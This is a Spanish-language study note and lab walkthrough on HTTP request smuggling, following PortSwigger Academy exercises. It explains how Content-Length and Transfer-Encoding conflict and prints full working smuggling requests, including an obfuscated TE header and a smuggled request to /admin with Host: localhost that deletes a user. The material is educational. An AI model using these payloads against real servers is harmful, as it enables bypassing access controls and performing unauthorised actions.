# HTTP request smugglin 

> El contrabando de solicitudes HTTP es una técnica para interferir con la forma en que un sitio web procesa secuencias de solicitudes HTTP que se reciben de uno o más usuarios.

> Los usuarios envían solicitudes a un servidor front-end (a veces denominado equilibrador de carga o proxy inverso) y este servidor reenvía las solicitudes a uno o más servidores back-end. Este tipo de arquitectura es cada vez más común, y en algunos casos inevitable, en las aplicaciones modernas basadas en la nube. El protocolo es muy simple: las solicitudes HTTP se envían una tras otra y el servidor receptor analiza los encabezados de las solicitudes HTTP para determinar dónde termina una solicitud y comienza la siguiente. En esta situación, es crucial que los sistemas front-end y back-end estén de acuerdo sobre los límites entre las solicitudes. De lo contrario, un atacante podría enviar una solicitud ambigua que los sistemas front-end y back-end interpretan de manera diferente


# Aprovechar la especificacion para realizar cosas diferentes

> Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.

```
El encabezado Content-Length es sencillo: especifica la longitud del cuerpo del mensaje en bytes. Por ejemplo

POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

```

### ***En este ejemplo vale la pena recalcar que Content-Length manda la informacion en bytes y que en formato hex cada caracter equivale a 4 bits y cada caracter se forma por lo regular de 2 numeros hex por ejemplo 2e (el punto) entonces cada caracter ascii equivaldria a un byte***



```
El encabezado Transfer-Encoding se puede usar para especificar que el cuerpo del mensaje usa codificación fragmentada. Esto significa que el cuerpo del mensaje contiene uno o más fragmentos de datos. Cada fragmento consta del tamaño del fragmento en bytes (expresado en hexadecimal), seguido de una nueva línea, seguido del contenido del fragmento. El mensaje se termina con un trozo de tamaño cero. Por ejemplo:

POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0

```

### En este caso recordar que la cabecera Transfer-Encoding pasa datos de la siguiente maneja en salto de linea despues el valor en hex del tamaño de datos a pasar  + salto de linea +
despues los datos en si ( b es 11 en hex) y al final ya cuando no se enviaran mas datos pone un 0 y el salto de linea y asi se acaba.

## ***En Resumen*** http request smuggling es pasar de contrabando una solicitud al servidor de back-end, de modo que la próxima solicitud procesada por el servidor de back-end parezca usar el método GPOST u otra. Todo esto aprovechando que no se sabe donde acaba la primera solicitud. ( esta algo dificil de comprender)

# Casos que se pueden encontrar 

Recordar para que sirven esta headers *** Two different methods for specifying the length of HTTP messages****  Content-Length y Transfer-Encoding header (chunked encoding).

## CL.TE

Donde el fron end usa el  Content-Length  y el back end usa el Transfer-Encoding header 

## TE.CL

Donde el front end usar el Transfer-Encoding header  header y el back end el Content-Length.

## TE.TE

Donde el front end usa el Transfer-Encoding header e igualmente el back end Transfer-Encoding header.

# Burp  HTTP Request Smuggler

Para trabajar con esta vulnerabilidad te recomiendan utilizar esta extencion de burp.


# Manually Calculate HTTP Content Length

```
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/plain
Content-Length: 6

Hello!
```

Para medir el content length manualmente se calcula despues de los saltos de linea 

```
485454502f312e3120323030204f4b0a5365727665723a206e67696e780a436f6e74656e742d547970653a20746578742f706c61696e0a436f6e74656e742d4c656e6774683a2036***0d0a0d0a***48656c6c6f21
````

The bytes after "0d0a0d0a" will be used to calculate the content length. As bytes are represented with two hexadecimal digits, one can divide the number of digits by two to obtain the content length (There are 12 hexadecimal digits in "48656c6c6f21" which equates to six bytes, as indicated in the header "Content-Length: 6" sent from the server). While one may have merely counted the characters in the string, "Hello!", HTTP bodies frequently include non-printable characters (such as spaces and line-endings), compressed payloads, and other data.

> https://support.f5.com/csp/article/K36105252

## Transfer-Encoding
El encabezado Transfer-Encoding especifica la forma de codificación utilizada para transferir de forma segura el cuerpo del payload (en-US) al usuario.

### chunked

Los datos se envían en una serie de fragmentos. ***El encabezado Content-Length se omite en este caso**** y al comienzo de cada fragmento debe agregar la longitud del fragmento actual en formato hexadecimal, seguido de '\r\n' y luego el trozo en sí, seguido de otro '\r\n'. ***El trozo de terminación es un trozo regular, con la excepción de que su longitud es cero.*** Le sigue el avance, que consiste en una secuencia (posiblemente vacía) de campos de encabezado de entidad.

# HTTP request smuggling, basic CL.TE vulnerability


Para este lab tenemos que el front end acepta Content-Lenght y el servidor acepta Trasfer-Encoding 

```

POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G


```
# HTTP request smuggling, basic TE.CL vulnerability

Para este laboratiorio el fron en acepta el header  Transfer-Encoding y el back-end el Content-Lenght.

```
POST / HTTP/1.1
Host: 0a4c00f00330561dc002744700960007.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

# HTTP request smuggling, obfuscating the TE header

Para este lab solo se ofusco la cabecera añadiendole el "Transfer-encoding: cow"

```
POST / HTTP/1.1
Host: 0a920094049d0bffc0ba45dc00cc0016.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
Recuerda que los salto de liena son dos caracteres por eso es 4 y en el caso del final son 4 caracteres \r\n\r\n. 
Referencias 

# HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

Para este laboratorio se intenta inyectar por asi decirlo mas bien que el servidor interprete una peticion que no deberia

```

POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X

```

Como nota se agarra la primera peticon la que se hace a la raiz y se envia 2 veces.


# HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

Para este laboratorio observo que el Trasfer-Encoding es el que acepta el front end y el Content-Length es el que acepta el backend si te das cuenta como se
quiere que el back interprete la siguiente peticion de lo que nosotros le inyectemos se sa Coten:

```
POST / HTTP/1.1
Host: 0ac300f5049f93aac01f310600df0059.web-security-academy.net
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Nota siempre quito todo lo anterior de la peticion pero hasta User-Agent y siempre me ha funcionado. Lo que se busca es que 
al mandar una segunda peticion e servidor interprete la peticion maliciosa que nosotros le enviamos.


# HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

Para este ab ek backend maneja el largo de las peticiones con Content-Lenght si envias get no lo permite reuerda que las peticiones get no tienen cuerpo
es por eso que se necesita enviar por POST.

```

POST / HTTP/1.1
Host: 0a71003e0350d78cd03aa36400420084.web-security-academy.net
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

# Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

El proposito de este laboratorio es entrar a el /admin mediante http request smugling para lo cual el front end acepta  Content-Length y el back end Trasfer-Encoding

````
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X

````
Para que esto funcione se necesita enviar esta percicion dos veces nos damos cuenta que tiene un mensaje que dice que solo
se puee acceder a ese panel admin usuarios locales entonces usamos la cabecera Host.

### HOST

>El encabezado de solicitud Host especifica el nombre de dominio del servidor (para hosting virtual), y (opcionalmente) el número de puerto TCP en el que el servidor esta escuchando.
Si no se provee un puerto, se usará el puerto por defecto para el servicio solicitado (e.j.: "80" para una URL HTTP).
El encabezado Host debe enviarse obligatoriamente en todas las solicitudes HTTP/1.1. Un código de error 400 (Petición mala) debería enviarse a cualquier solicitud HTTP/1.1 que no contiene o contiene más de un encabezado Host.

Continuando on el lab ponemos la cabecera host con localhost

```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X

```
Puede funcionar con X-Ignore: X ya sabiendo que se puede acceder a /admin solo borramos el usuario

```

POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=

```

Se borra el usuario carlos y se resuelve el lab


# 





> https://portswigger.net/web-security/request-smuggling
